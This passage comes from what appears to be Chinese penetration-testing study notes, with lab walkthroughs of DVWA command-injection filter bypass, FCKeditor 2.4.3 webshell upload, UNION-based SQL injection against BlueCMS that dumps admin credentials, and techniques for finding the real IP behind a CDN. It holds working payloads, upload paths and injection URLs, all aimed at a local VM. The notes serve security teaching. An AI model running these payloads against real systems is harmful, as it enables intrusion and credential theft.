?&gt;
</pre>
</div>

<div class="org-src-container">
<pre class="src src-sh">127.0.0.1 &amp; ls
127.0.0.1 ; ls <span style="color: #b22222;"># </span><span style="color: #b22222;">&#19981;&#33021;&#29992;&#20102;</span>
</pre>
</div>


<figure id="org23bd67c">
<img src="./images/img_20230717_171940.png" alt="img_20230717_171940.png" width="50%">

</figure>



<figure id="orgfac9960">
<img src="./images/img_20230717_171953.png" alt="img_20230717_171953.png" width="50%">

</figure>
</div>
</div>
<div id="outline-container-h:a2959082-9d06-4bbc-8c49-12051b1c2a8e" class="outline-4">
<h4 id="h:a2959082-9d06-4bbc-8c49-12051b1c2a8e">High级别</h4>
<div class="outline-text-4" id="text-h:a2959082-9d06-4bbc-8c49-12051b1c2a8e">
<p>
对于High，它对可能造成攻击的符号都进行了过滤操作，但是在对 | 进行过滤的时候，多了一个空格，如下：
</p>

<div class="org-src-container">
<pre class="src src-sh">&lt;?php

<span style="color: #a020f0;">if</span>( isset( $<span style="color: #a0522d;">_POST</span>[ <span style="color: #8b2252;">'Submit'</span> ]  ) ) {
    // Get input
    $<span style="color: #a0522d;">target</span> = trim($<span style="color: #a0522d;">_REQUEST</span>[ <span style="color: #8b2252;">'ip'</span> ]);

    // Set blacklist
    $<span style="color: #a0522d;">substitutions</span> = array(
        <span style="color: #8b2252;">'&amp;'</span>  =&gt; <span style="color: #8b2252;">''</span>,
        <span style="color: #8b2252;">';'</span>  =&gt; <span style="color: #8b2252;">''</span>,
        <span style="color: #8b2252;">'| '</span> =&gt; <span style="color: #8b2252;">''</span>,
        <span style="color: #8b2252;">'-'</span>  =&gt; <span style="color: #8b2252;">''</span>,
        <span style="color: #8b2252;">'$'</span>  =&gt; <span style="color: #8b2252;">''</span>,
        <span style="color: #8b2252;">'('</span>  =&gt; <span style="color: #8b2252;">''</span>,
        <span style="color: #8b2252;">')'</span>  =&gt; <span style="color: #8b2252;">''</span>,
        <span style="color: #8b2252;">'`'</span>  =&gt; <span style="color: #8b2252;">''</span>,
        <span style="color: #8b2252;">'||'</span> =&gt; <span style="color: #8b2252;">''</span>,
    );

    // Remove any of the charactars<span style="color: #a020f0;"> in</span> the array (blacklist)<span style="color: #483d8b;">.</span>
    $<span style="color: #a0522d;">target</span> = str_replace( array_keys( $<span style="color: #a0522d;">substitutions</span> ), $<span style="color: #a0522d;">substitutions</span>, $<span style="color: #a0522d;">target</span> );

    // Determine OS and execute the ping command.
    <span style="color: #a020f0;">if</span>( stristr( php_uname( <span style="color: #8b2252;">'s'</span> ), <span style="color: #8b2252;">'Windows NT'</span> ) ) {
        // Windows
        $<span style="color: #a0522d;">cmd</span> = shell_exec( <span style="color: #8b2252;">'ping  '</span> . $<span style="color: #a0522d;">target</span> );
    }
    <span style="color: #a020f0;">else</span> {
        // *nix
        $<span style="color: #a0522d;">cmd</span> = shell_exec( <span style="color: #8b2252;">'ping  -c 4 '</span> . $<span style="color: #a0522d;">target</span> );
    }

    // Feedback for the end user
    <span style="color: #483d8b;">echo</span> <span style="color: #8b2252;">"&lt;pre&gt;{$cmd}&lt;/pre&gt;"</span>;
}

?&gt;
</pre>
</div>

<p>
在命令行中进行操作的时候，空格不一定是必须的，如果输入 <code>127.0.0.1 | ls</code> （即竖线后有空格）和 <code>127.0.0.1|ls</code> ，两者效果一致，所以只要不加空格同样可以造成攻击。
</p>



<figure id="org4d37716">
<img src="./images/img_20230717_172116.png" alt="img_20230717_172116.png" width="50%">

</figure>
</div>
</div>
</div>
</section>
<section id="outline-container-h:6789d493-bc97-45f5-bff6-a2c660e6835f" class="outline-2">
<h2 id="h:6789d493-bc97-45f5-bff6-a2c660e6835f">反序列化漏洞</h2>
<div class="outline-text-2" id="text-h:6789d493-bc97-45f5-bff6-a2c660e6835f">
<p>
序列化：把对象转换为字节序列的过程称为对象的序列化。
</p>

<p>
反序列化：把字节序列恢复为对象的过程称为对象的反序列化。
</p>

<div class="org-src-container">
<pre class="src src-sh">xxx class {
    string students;
    int age
}
xxx_C1 = new xxx();
</pre>
</div>

<p>
在反序列化时，存在用户可控的参数，并且在读取反序列化内容时存在危险的调用函数，则存在反序列化漏洞。
</p>
</div>
<div id="outline-container-h:e3f783f5-c46d-44fc-a0ba-331bcb00811a" class="outline-3">
<h3 id="h:e3f783f5-c46d-44fc-a0ba-331bcb00811a">为什么要序列化？</h3>
<div class="outline-text-3" id="text-h:e3f783f5-c46d-44fc-a0ba-331bcb00811a">
<p>
我们都知道，在进行浏览器访问的时候，我们看到的文本、图片、音频、视频等都是通过二进制序列进行传输的，那么如果我们需要将代码对象进行传输的时候，是不是也应该先将对象进行序列化？答案是肯定的，我们需要先将代码对象进行序列化（否则会造成代码格式被破坏、内容丢失），然后通过网络，IO进行传输，当到达目的地之后，再进行反序列化获取到我们想要的对象，最后完成通信。
</p>
</div>
</div>
<div id="outline-container-h:f8ce0d07-a150-4fa7-9d6d-6159888d3377" class="outline-3">
<h3 id="h:f8ce0d07-a150-4fa7-9d6d-6159888d3377">检测方法</h3>
<div class="outline-text-3" id="text-h:f8ce0d07-a150-4fa7-9d6d-6159888d3377">
<p>
反序列化漏洞有非常多的利用工具，可自行去网上寻找使用。下图就给出了一种反序列化的利用工具：
</p>



<figure id="org6bd3d30">
<img src="./images/img_20230717_172351.png" alt="img_20230717_172351.png" width="50%">

</figure>
</div>
</div>
<div id="outline-container-h:75a0e896-fee3-43b2-a407-f8c4ddcbf555" class="outline-3">
<h3 id="h:75a0e896-fee3-43b2-a407-f8c4ddcbf555">漏洞修复</h3>
<div class="outline-text-3" id="text-h:75a0e896-fee3-43b2-a407-f8c4ddcbf555">
<ul class="org-ul">
<li>过滤反序列化的内容</li>
<li>只反序列化可信来源的数据</li>
</ul>

<p>
参考
</p>
<ul class="org-ul">
<li><a href="../other/the-road-to-web-security/the-road-to-web-security.html#序列化与反序列化">序列化与反序列化</a></li>
<li>php: <a href="../12-代码审计/12-代码审计.html#反序列化">反序列化</a></li>
<li>java: <a href="../13-代码审计进阶/13-代码审计进阶.html#Fastjson反序列化">Fastjson反序列化</a></li>
</ul>
</div>
</div>
</section>
<section id="outline-container-h:71958896-5e7e-4030-b345-ed87ece3529f" class="outline-2">
<h2 id="h:71958896-5e7e-4030-b345-ed87ece3529f">编辑漏洞</h2>
<div class="outline-text-2" id="text-h:71958896-5e7e-4030-b345-ed87ece3529f">
<p>
主要内容：
</p>
<ul class="org-ul">
<li>常规编辑器漏洞介绍</li>
<li>常规编辑器漏洞攻击还原</li>
</ul>
</div>
<div id="outline-container-h:34cd5cbf-ffa3-4a05-b5cc-be6ccfc68338" class="outline-3">
<h3 id="h:34cd5cbf-ffa3-4a05-b5cc-be6ccfc68338">常规编辑器漏洞介绍</h3>
<div class="outline-text-3" id="text-h:34cd5cbf-ffa3-4a05-b5cc-be6ccfc68338">
<p>
编辑器漏洞实际不是某一类漏洞，不像xss，sql注入是一类漏洞，编辑器本身也存在漏洞，本章介绍的是编辑器中文件上传漏洞。
</p>

<p>
一般的企业搭建网站有可能是用通用的模板，比如wordpress，emblog，zblog，discuz，dedecms等等，这些现成的 CMS(contet management system 内容管理系统) 后台如果需要发文章，可能会用到编辑器，比如ewebeditor，fckeditor，kindeditor，ueditor等等， 这些编辑器是有专门的团队运营开发的。编辑器有可能存在漏洞，只要使用了该编辑器并且该编辑器的版本存在漏洞，那么网站就会存在相应的漏洞。
</p>

<p>
编辑器漏洞通常有如下利用方式：
</p>
<ul class="org-ul">
<li>编辑器配合解析漏洞进行利用</li>
<li>编辑器自身的漏洞利用</li>
</ul>
</div>
<div id="outline-container-h:24edee9e-f76f-47a6-b745-6d6b8264012f" class="outline-4">
<h4 id="h:24edee9e-f76f-47a6-b745-6d6b8264012f">FCKeditor</h4>
<div class="outline-text-4" id="text-h:24edee9e-f76f-47a6-b745-6d6b8264012f">
<p>
<b>获取版本号：</b>
</p>

<div class="org-src-container">
<pre class="src src-sh">/FCKeditor/_whatsnew.html
/Fckeditor/editor/dialog/fck_about.html
</pre>
</div>

<p>
<b>常见的测试上传地址：</b>
</p>

<div class="org-src-container">
<pre class="src src-sh">FCKeditor/editor/filemanager/browser/default/connectors/test.html
FCKeditor/editor/filemanager/upload/test.html
FCKeditor/editor/filemanager/connectors/test.html
FCKeditor/editor/filemanager/connectors/uploadtest.html
FCKeditor/editor/filemanager/browser/default/browser.html
</pre>
</div>

<p>
<b>常见的示例上传地址：</b>
</p>

<div class="org-src-container">
<pre class="src src-sh">FCKeditor/_samples/default.html
FCKeditor/editor/fckeditor.htm
FCKeditor/editor/fckdialog.html
</pre>
</div>

<p>
<b>可能存在的其他上传点：</b>
</p>

<div class="org-src-container">
<pre class="src src-sh">FCKeditor/editor/filemanager/browser/default/connectors/asp/connector.asp? <span style="color: #a0522d;">Command</span>=GetFoldersAndFiles&amp;<span style="color: #a0522d;">Type</span>=Image&amp;<span style="color: #a0522d;">CurrentFolder</span>=/

FCKeditor/editor/filemanager/browser/default/connectors/php/connector.php? <span style="color: #a0522d;">Command</span>=GetFoldersAndFiles&amp;<span style="color: #a0522d;">Type</span>=Image&amp;<span style="color: #a0522d;">CurrentFolder</span>=/

FCKeditor/editor/filemanager/browser/default/connectors/aspx/connector.aspx? <span style="color: #a0522d;">Command</span>=GetFoldersAndFiles&amp;<span style="color: #a0522d;">Type</span>=Image&amp;<span style="color: #a0522d;">CurrentFolder</span>=/

FCKeditor/editor/filemanager/browser/default/connectors/jsp/connector.jsp? <span style="color: #a0522d;">Command</span>=GetFoldersAndFiles&amp;<span style="color: #a0522d;">Type</span>=Image&amp;<span style="color: #a0522d;">CurrentFolder</span>=/

FCKeditor/editor/filemanager/browser/default/browser.html? <span style="color: #a0522d;">Type</span>=Image&amp;<span style="color: #a0522d;">Connector</span>=http://www.site.com/fckeditor/editor/filemanager/connectors /php/connector.php

FCKeditor/editor/filemanager/browser/default/browser.html? <span style="color: #a0522d;">Type</span>=Image&amp;<span style="color: #a0522d;">Connector</span>=http://www.site.com/fckeditor/editor/filemanager/connectors /asp/connector.asp

FCKeditor/editor/filemanager/browser/default/browser.html? <span style="color: #a0522d;">Type</span>=Image&amp;<span style="color: #a0522d;">Connector</span>=http://www.site.com/fckeditor/editor/filemanager/connectors /aspx/connector.aspx

FCKeditor/editor/filemanager/browser/default/browser.html? <span style="color: #a0522d;">Type</span>=Image&amp;<span style="color: #a0522d;">Connector</span>=http://www.site.com/fckeditor/editor/filemanager/connectors /jsp/connector.jsp
</pre>
</div>

<p>
<b>browser.html文件：</b>
</p>

<div class="org-src-container">
<pre class="src src-sh">FCKeditor/editor/filemanager/browser/default/browser.html? <span style="color: #a0522d;">type</span>=Image&amp;<span style="color: #a0522d;">connector</span>=connectors/asp/connector.asp

FCKeditor/editor/filemanager/browser/default/browser.html? <span style="color: #a0522d;">Type</span>=Image&amp;<span style="color: #a0522d;">Connector</span>=connectors/jsp/connector.jsp

fckeditor/editor/filemanager/browser/default/browser.html? <span style="color: #a0522d;">Type</span>=Image&amp;<span style="color: #a0522d;">Connector</span>=connectors/aspx/connector.Aspx

fckeditor/editor/filemanager/browser/default/browser.html? <span style="color: #a0522d;">Type</span>=Image&amp;<span style="color: #a0522d;">Connector</span>=connectors/php/connector.php
</pre>
</div>
</div>
</div>
<div id="outline-container-h:2b22a1a2-7462-46a8-b49a-3a25f025e915" class="outline-4">
<h4 id="h:2b22a1a2-7462-46a8-b49a-3a25f025e915">常规编辑器漏洞攻击还原</h4>
<div class="outline-text-4" id="text-h:2b22a1a2-7462-46a8-b49a-3a25f025e915">
</div>
<div id="outline-container-h:70bbdc92-c49f-41a1-aa81-95accadb50ac" class="outline-5">
<h5 id="h:70bbdc92-c49f-41a1-aa81-95accadb50ac">挖掘编辑器漏洞思路：</h5>
<div class="outline-text-5" id="text-h:70bbdc92-c49f-41a1-aa81-95accadb50ac">
<ul class="org-ul">
<li>通过目录扫描，爬虫识别编辑器</li>
<li>寻找编辑器版本对应的漏洞</li>
<li>利用该编辑器漏洞</li>
</ul>
</div>
</div>
<div id="outline-container-h:46d70960-34e0-4b72-bcdf-70984db7761f" class="outline-5">
<h5 id="h:46d70960-34e0-4b72-bcdf-70984db7761f">FCKeditor编辑器漏洞攻击还原：</h5>
<div class="outline-text-5" id="text-h:46d70960-34e0-4b72-bcdf-70984db7761f">
<p>
首先搭建环境：Windows 7 + phpstudy_64（php 5.4.45）
</p>
<ul class="org-ul">
<li>phpstudy 软件管理，安装php 5.4.45</li>
<li>网站 &#x2013;&gt; 管理 &#x2013;&gt; php软件设置为刚安装的php版本</li>
<li>网站 &#x2013;&gt; 管理 &#x2013;&gt; 打开网站根目录</li>
<li>将 FCKeditor 源代码放进网站根目录</li>
<li>首页 &#x2013;&gt; 启动 WNMP</li>
<li>查看虚拟机ip，打开 cmd  输入 ipconfig</li>
<li>浏览器访问对应ip</li>
</ul>


<figure id="org01cf052">
<img src="./images/img_20230718_140008.png" alt="img_20230718_140008.png" width="50%">

</figure>



<figure id="orgf3d93af">
<img src="./images/img_20230718_140027.png" alt="img_20230718_140027.png" width="50%">

</figure>


<p>
目录扫描发现目标网站存在FCKeditor：
</p>



<figure id="orgfd68196">
<img src="./images/img_20230718_140133.png" alt="img_20230718_140133.png" width="50%">

</figure>

<p>
查看版本：
</p>

<p>
<a href="http://192.168.190.128/Fckeditor/editor/dialog/fck_about.html">http://192.168.190.128/Fckeditor/editor/dialog/fck_about.html</a>
</p>



<figure id="orga351743">
<img src="./images/img_20230718_140211.png" alt="img_20230718_140211.png" width="50%">

</figure>

<p>
<a href="http://192.168.190.128/FCKeditor/_whatsnew.html">http://192.168.190.128/FCKeditor/_whatsnew.html</a>
</p>



<figure id="org8bd29d2">
<img src="./images/img_20230718_140234.png" alt="img_20230718_140234.png" width="50%">

</figure>

<p>
判断出该FCKeditor编辑器版本为：2.4.3
</p>

<p>
利用示例页面进行上传
</p>

<p>
<a href="http://192.168.190.128/Fckeditor/editor/fckeditor.html">http://192.168.190.128/Fckeditor/editor/fckeditor.html</a>
</p>



<figure id="org2dac454">
<img src="./images/img_20230718_140305.png" alt="img_20230718_140305.png" width="50%">

</figure>


<p>
点击插入/编辑图像，点击链接，Browse Server
</p>



<figure id="orgb56a706">
<img src="./images/img_20230718_140332.png" alt="img_20230718_140332.png" width="50%">

</figure>


<p>
会出现FCK上传页面
<a href="http://192.168.190.128/Fckeditor/editor/filemanager/browser/default/browser.html?Connector=connectors/asp/connector.asp">http://192.168.190.128/Fckeditor/editor/filemanager/browser/default/browser.html?Connector=connectors/asp/connector.asp</a>
</p>



<figure id="orgf32b605">
<img src="./images/img_20230718_140408.png" alt="img_20230718_140408.png" width="50%">

</figure>


<p>
这里要注意，我们搭建站点使用的是PHP环境，而链接中的环境是ASP，需要进行修改asp换成php。
</p>

<p>
访问链接
<a href="http://192.168.190.128/fckeditor/editor/filemanager/browser/default/browser.html?Connector=connectors/php/connector.php">http://192.168.190.128/fckeditor/editor/filemanager/browser/default/browser.html?Connector=connectors/php/connector.php</a> 发现存在报错
</p>



<figure id="org9b35680">
<img src="./images/img_20230718_140444.png" alt="img_20230718_140444.png" width="50%">

</figure>


<p>
访问
C:\phpstudy_pro\WWW\FCKeditor\editor\filemanager\browser\default\connectors\php\config.php，修改配置如下并保存：
</p>

<p>
上传路径：C:\phpstudy_pro\WWW\FCKeditor\editor\filemanager\browser\default\images
</p>



<figure id="orgef04dc4">
<img src="./images/img_20230718_140523.png" alt="img_20230718_140523.png" width="50%">

</figure>


<p>
再次访问链接
<a href="http://192.168.190.128/fckeditor/editor/filemanager/browser/default/browser.html?Connector=connectors/php/connector.php">http://192.168.190.128/fckeditor/editor/filemanager/browser/default/browser.html?Connector=connectors/php/connector.php</a> ，可以正常访问
</p>



<figure id="orgadd5a5f">
<img src="./images/img_20230718_140559.png" alt="img_20230718_140559.png" width="50%">

</figure>

<p>
上传PHP文件，抓包，修改php后缀，增加空格
</p>



<figure id="org3bc7b58">
<img src="./images/img_20230718_140620.png" alt="img_20230718_140620.png" width="50%">

</figure>

<p>
上传成功后，根据前面的配置文件可以构造出路径：
<a href="http://192.168.190.128/FCKeditor%5Ceditor%5Cfilemanager%5Cbrowser%5Cdefault%5Cimages%5Cfile/post.php">http://192.168.190.128/FCKeditor%5Ceditor%5Cfilemanager%5Cbrowser%5Cdefault%5Cimages%5Cfile/post.php</a>
</p>



<figure id="org751669b">
<img src="./images/img_20230718_140654.png" alt="img_20230718_140654.png" width="50%">

</figure>

<p>
蚁剑成功获取web服务器权限
</p>



<figure id="org7a9eacc">
<img src="./images/img_20230718_140714.png" alt="img_20230718_140714.png" width="50%">

</figure>

<p>
此外，关于该实验环境，也可以通过测试页面进行上传：
<a href="http://192.168.190.128/FCKeditor/editor/filemanager/browser/default/connectors/test.html">http://192.168.190.128/FCKeditor/editor/filemanager/browser/default/connectors/test.html</a>
</p>



<figure id="org4614997">
<img src="./images/img_20230718_140736.png" alt="img_20230718_140736.png" width="50%">

</figure>

<p>
使用FCK综合利用工具进行利用
</p>


<figure id="org541b35d">
<img src="./images/img_20230718_140758.png" alt="img_20230718_140758.png" width="50%">

</figure>
</div>
</div>
</div>
</div>
</section>
<section id="outline-container-h:f7e72031-5f0e-488a-bdf0-02cda6f675ab" class="outline-2">
<h2 id="h:f7e72031-5f0e-488a-bdf0-02cda6f675ab">旁注、跨库、CDN绕过</h2>
<div class="outline-text-2" id="text-h:f7e72031-5f0e-488a-bdf0-02cda6f675ab">
<p>
主要内容：
</p>
<ul class="org-ul">
<li>渗透测试之旁注</li>
<li>跨库与 CDN 查找</li>
</ul>

<p>
旁站：一台服务器可以起多个 web 服务，通过不同的端口对外提供服务，这些站点彼此之间互为旁站的关系
旁站入侵，针对旁站的注入就是旁注，属于旁站入侵的一种。
</p>
</div>
<div id="outline-container-h:8d090d88-29e3-4501-a337-98ce6c24a8ac" class="outline-3">
<h3 id="h:8d090d88-29e3-4501-a337-98ce6c24a8ac">渗透测试之旁注、跨库</h3>
<div class="outline-text-3" id="text-h:8d090d88-29e3-4501-a337-98ce6c24a8ac">
<p>
<b>漏洞环境搭建</b>
</p>

<p>
bluecms v1.6 sp1源码
windows 7
phpstudy2018 或者 64 (php 5.4.45）
</p>

<p>
如果使用 linux 版 phpstudy，修改 php.ini 配置
</p>
<div class="org-src-container">
<pre class="src src-sh"><span style="color: #b22222;"># </span><span style="color: #b22222;">&#25253;&#38169;&#65306;Notice: Use of undefined constant ....</span>
<span style="color: #b22222;"># </span><span style="color: #b22222;">&#35299;&#20915;</span>
error_reporting = E_ALL &amp; ~E_NOTICE
</pre>
</div>

<p>
将bluecms源码放入phpstudy网站目录中
</p>



<figure id="orge8dd3ae">
<img src="./images/img_20230718_141014.png" alt="img_20230718_141014.png" width="50%">

</figure>

<p>
之后访问 bluecms/uploads/install/ 进行安装
</p>



<figure id="orgcee638e">
<img src="./images/img_20230718_141112.png" alt="img_20230718_141112.png" width="50%">

</figure>

<p>
填写库名bluecms，数据库账号密码，默认是 <b>root/root</b> ，数据表前缀blue_，管理员账号密码admin/admin，下一步
</p>



<figure id="orga150cec">
<img src="./images/img_20230725_102529.png" alt="img_20230725_102529.png" width="50%">

</figure>


<p>
返回空白安装成功
</p>



<figure id="org175fda4">
<img src="./images/img_20230718_141201.png" alt="img_20230718_141201.png" width="50%">

</figure>


<p>
<b>旁注和跨库演示</b>
</p>

<p>
在渗透测试过程中，如果正面难以突破，那么就采用一些迂回战术，从侧面来进行。也就是采用一些间接的方法，例如旁注，通过旁站来进行渗透。
</p>

<p>
假如页面存在删除功能：账号有权限之分，正常来说，管理员具备删除权限，普通用户不具备
</p>
<ul class="org-ul">
<li>想办法找到删除功能的接口地址</li>
<li>登录一个普通用户，访问该接口地址，看看是否能够成功执行删除操作。如果能的话，这就是越权漏洞。</li>
<li>还可以以不登录状态，访问该接口地址，看看是否能够成功执行删除操作。如果能的话，这就是未授权访问。</li>
</ul>

<p>
假如在某次渗透测试过程中我们发现主站难以攻破，又发现存在旁站bluecms，于是通过旁站来进行攻击：
</p>

<div class="org-src-container">
<pre class="src src-sh">192.168.190.128/bluecms/uploads/
</pre>
</div>


<figure id="orge8836b5">
<img src="./images/img_20230718_141412.png" alt="img_20230718_141412.png" width="50%">

</figure>

<p>
从页面上看仅能看到登录功能点、注册功能点；网站的功能越少漏洞越少，因为网站的攻击面小。
分析登录功能，要想登录数据包要有哪些参数分别什么作用：
</p>
<ul class="org-ul">
<li>用户名密码就作认证用的</li>
<li>token 是二次校验用的</li>
<li>path 设置访问路径用的</li>
</ul>

<p>
一般登录是个 sql 查询过程，有可能存在 sql 漏洞，而 <code>xxx or 1 = 1</code> 常被用来当万能密码使用。
</p>

<p>
网站功能比较少，这时采取迂回攻击，找网站后台。有 2 种方法：
</p>
<ul class="org-ul">
<li>用御剑后台扫描工具</li>
<li>用猜的：console\login\admin\manage\system</li>
</ul>

<p>
通过猜测发现旁站后台，使用账号密码（admin/admin）进行登录，获取旁站后台管理员权限：
使用 burp suite admin账号爆破密码
</p>

<div class="org-src-container">
<pre class="src src-sh"><span style="color: #b22222;"># </span><span style="color: #b22222;">&#30331;&#24405;</span>
http://192.168.190.128/bluecms/uploads/admin/login.php?<span style="color: #a0522d;">act</span>=login
</pre>
</div>



<figure id="orgfd5061c">
<img src="./images/img_20230718_141452.png" alt="img_20230718_141452.png" width="50%">

</figure>


<figure id="org8a5d0b3">
<img src="./images/img_20230718_141513.png" alt="img_20230718_141513.png" width="50%">

</figure>

<p>
在模块管理-广告管理-添加新广告后，发现“获取JS”的功能：
</p>


<figure id="orgca54796">
<img src="./images/img_20230718_141531.png" alt="img_20230718_141531.png" width="50%">

</figure>

<p>
对"获取JS"功能的思考：
</p>
<ul class="org-ul">
<li>JS从哪里获取的？可以是服务器上的文件、数据库、远程服务器
<ul class="org-ul">
<li>内网服务器：本地文件、远程文件（内网中其它机器上的文件），可能存在 SSRF 漏洞</li>
<li>数据库：SQL 注入</li>
<li>外网服务器：文件包含</li>
</ul></li>
</ul>

<p>
对该功能点进行注入测试：
</p>

<div class="org-src-container">
<pre class="src src-sh">http://192.168.190.128/bluecms/uploads/ad_js.php?<span style="color: #a0522d;">ad_id</span>=-1111%27
</pre>
</div>


<figure id="org2491fa1">
<img src="./images/img_20230718_141739.png" alt="img_20230718_141739.png" width="50%">

</figure>

<p>
使用 union 联合注入的限制条件是左右两连列数保持一致
</p>

<p>
通过order by来判断sql语句查了多少列：
</p>

<div class="org-src-container">
<pre class="src src-sh">http://192.168.190.128/bluecms/uploads/ad_js.php?<span style="color: #a0522d;">ad_id</span>=-1111 order by 7
</pre>
</div>



<figure id="orgad8ac9e">
<img src="./images/img_20230718_141812.png" alt="img_20230718_141812.png" width="50%">

</figure>

<p>
order by 8报错，证明sql语句查了7列：
</p>


<figure id="org9273db7">
<img src="./images/img_20230718_141834.png" alt="img_20230718_141834.png" width="50%">

</figure>

<p>
页面显示位不足就让union后面的查询满足条件，ad_id用负数不可能被查询到
</p>

<p>
检查源代码，注入出数据库名为bluecms：
</p>
<div class="org-src-container">
<pre class="src src-sh">view-source:http://192.168.190.128/bluecms/uploads/ad_js.php?<span style="color: #a0522d;">ad_id</span>=-1111 union select 1,2,3,4,5,6,database()
</pre>
</div>


<figure id="org0b409a9">
<img src="./images/img_20230718_141929.png" alt="img_20230718_141929.png" width="50%">

</figure>

<p>
注入出数据用户名为root@localhost：
</p>

<div class="org-src-container">
<pre class="src src-sh">view-source:http://192.168.190.128/bluecms/uploads/ad_js.php?<span style="color: #a0522d;">ad_id</span>=-1111 union select 1,2,3,4,5,6,user()
</pre>
</div>


<figure id="orgb63cff1">
<img src="./images/img_20230718_142008.png" alt="img_20230718_142008.png" width="50%">

</figure>

<p>
注入出当前库所有的表名：
</p>

<div class="org-src-container">
<pre class="src src-sh">view-source:http://192.168.190.128/bluecms/uploads/ad_js.php?<span style="color: #a0522d;">ad_id</span>=-1111 union select 1,2,3,4,5,6,group_concat(table_name) from information_schema.tables where <span style="color: #a0522d;">table_schema</span>=database()
</pre>
</div>


<figure id="org7b7b25f">
<img src="./images/img_20230718_142106.png" alt="img_20230718_142106.png" width="50%">

</figure>


<p>
继续进行注入blue_user表中的字段名，发现报错，存在过滤，单引号前面出现\证明单引号被转义：
</p>

<div class="org-src-container">
<pre class="src src-sh">view-source:http://192.168.190.128/bluecms/uploads/ad_js.php?<span style="color: #a0522d;">ad_id</span>=-1111 union select 1,2,3,4,5,6,group_concat(column_name) from information_schema.columns where <span style="color: #a0522d;">table_schema</span>=database() and <span style="color: #a0522d;">table_name</span>=<span style="color: #8b2252;">'blue_user'</span>
</pre>
</div>

<p>
!
</p>


<figure id="org9e42e2d">
<img src="./images/img_20230718_142533.png" alt="img_20230718_142533.png" width="50%">

</figure>

<p>
使用16进制进行绕过：
</p>

<div class="org-src-container">
<pre class="src src-sh">view-source:http://192.168.190.128/bluecms/uploads/ad_js.php?<span style="color: #a0522d;">ad_id</span>=-1111 union select 1,2,3,4,5,6,group_concat(column_name) from information_schema.columns where <span style="color: #a0522d;">table_schema</span>=database() and <span style="color: #a0522d;">table_name</span>=0x626c75655f75736572
</pre>
</div>



<figure id="orge84e6b2">
<img src="./images/img_20230718_143033.png" alt="img_20230718_143033.png" width="50%">

</figure>

<p>
注入bluecms库中blue_user表中user_name以及pwd的字段内容：
</p>

<div class="org-src-container">
<pre class="src src-sh">view-source:http://192.168.190.128/bluecms/uploads/ad_js.php?<span style="color: #a0522d;">ad_id</span>=-1111 union select 1,2,3,4,5,6,concat(user_name,pwd) from blue_user
</pre>
</div>

<p>
可以在user_name和pwd中间加入0x7e，方便我们分割账号密码
</p>



<figure id="orgc132a18">
<img src="./images/img_20230718_143133.png" alt="img_20230718_143133.png" width="50%">

</figure>

<p>
admin以及21232f297a57a5a743894a0e4a801fc3，即web管理员的账号密码
</p>

<p>
通过在线解密：发现明文密码为admin
</p>

<p>
<a href="https://www.cmd5.com/">查md5</a>
</p>


<figure id="org33256d8">
<img src="./images/img_20230718_143223.png" alt="img_20230718_143223.png" width="50%">

</figure>


<p>
利用SQL注入能够跨越当前库，获取所有的数据库中的数据库名，表名，字段名：
</p>

<div class="org-src-container">
<pre class="src src-sh">view-source:http://192.168.190.128/bluecms/uploads/ad_js.php?<span style="color: #a0522d;">ad_id</span>=-1111 union select 1,2,3,4,5,6,group_concat(schema_name) from information_schema.schemata
</pre>
</div>


<figure id="org2ac3b00">
<img src="./images/img_20230718_143258.png" alt="img_20230718_143258.png" width="50%">

</figure>
</div>
</div>
<div id="outline-container-h:1ddb5064-da95-405e-99c6-461849338521" class="outline-3">
<h3 id="h:1ddb5064-da95-405e-99c6-461849338521">CDN绕过</h3>
<div class="outline-text-3" id="text-h:1ddb5064-da95-405e-99c6-461849338521">
<p>
<b>CDN概述</b>
</p>

<p>
CDN的全称是Content Delivery Network，即内容分发网络。CDN是构建在现有网络基础之上的智能虚拟网络，依靠部署在各地的边缘服务器，通过中心平台的负载均衡、内容分发、调度等功能模块，使用户就近获取所需内容，降低网络拥塞，提高用户访问响应速度和命中率。
</p>

<p>
<b>域名解析过程</b>
</p>

<p>
传统访问：用户访问域名&#x2013;&gt;解析IP&#x2013;&gt;访问目标主机
</p>

<p>
CDN模式：用户访问域名&#x2013;&gt;CDN节点&#x2013;&gt;真实IP&#x2013;&gt;目标主机
</p>

<p>
<b>检测网站是否采用了CDN</b>
</p>

<p>
1、利用“多地Ping”
</p>

<p>
快速检测目标是否存在CDN，如果得到的IP归属地是某CDN服务商，或者每个地区得到的IP地址都不一样则说明可能存在CDN，可用以下几个网站检测！
</p>

<p>
<a href="https://www.17ce.com/">https://www.17ce.com/</a>
<a href="http://ping.chinaz.com">http://ping.chinaz.com</a>
<a href="https://wepcc.com">https://wepcc.com</a>
<a href="https://asm.ca.com/en/ping.php">https://asm.ca.com/en/ping.php</a>
<a href="http://ping.aizhan.com/">http://ping.aizhan.com/</a>
<a href="http://ce.cloud.360.cn/">http://ce.cloud.360.cn/</a>
</p>

<p>
2、利用nslookup
</p>

<p>
如果返回域名解析对应多个 IP 地址多半是使用了 CDN
</p>

<div class="org-src-container">
<pre class="src src-sh">nslookup www.163.com
</pre>
</div>
</div>
<div id="outline-container-h:f84d357d-4149-4bb5-b039-01e50e2a5784" class="outline-4">
<h4 id="h:f84d357d-4149-4bb5-b039-01e50e2a5784">查找真实IP方法</h4>
<div class="outline-text-4" id="text-h:f84d357d-4149-4bb5-b039-01e50e2a5784">
<p>
1、查询历史DNS记录
</p>

<p>
DNS查询：<a href="https://www.malapan.com/dnshistory/">https://www.malapan.com/dnshistory/</a> <a href="https://dnsdb.io/zh-cn/">https://dnsdb.io/zh-cn/</a> <a href="https://www.racent.com/dns-check">https://www.racent.com/dns-check</a>
微步在线：<a href="https://x.threatbook.cn/">https://x.threatbook.cn/</a>
在线域名信息查询：<a href="http://toolbar.netcraft.com/site_report?url=">http://toolbar.netcraft.com/site_report?url=</a>
DNS、IP等查询：<a href="http://viewdns.info/">http://viewdns.info/</a>
CDN查询IP：<a href="https://tools.ipip.net/cdn.php">https://tools.ipip.net/cdn.php</a>
SecurityTrails平台：<a href="https://securitytrails.com/">https://securitytrails.com/</a>
</p>

<p>
2、子域名查询
</p>

<p>
很多站长可能只会对主站或者流量大的子站点做了 CDN，而很多小站子站点又跟主站在同一台服务器或者同一个C段内，此时就可以通过查询子域名对应的 IP 来辅助查找网站的真实IP
</p>

<ul class="org-ul">
<li>第三方接口：</li>
</ul>
<p>
<a href="https://x.threatbook.cn/">https://x.threatbook.cn/</a>
<a href="https://dnsdb.io/zh-cn/">https://dnsdb.io/zh-cn/</a>
<a href="https://site.ip138.com/">https://site.ip138.com/</a>
</p>

<ul class="org-ul">
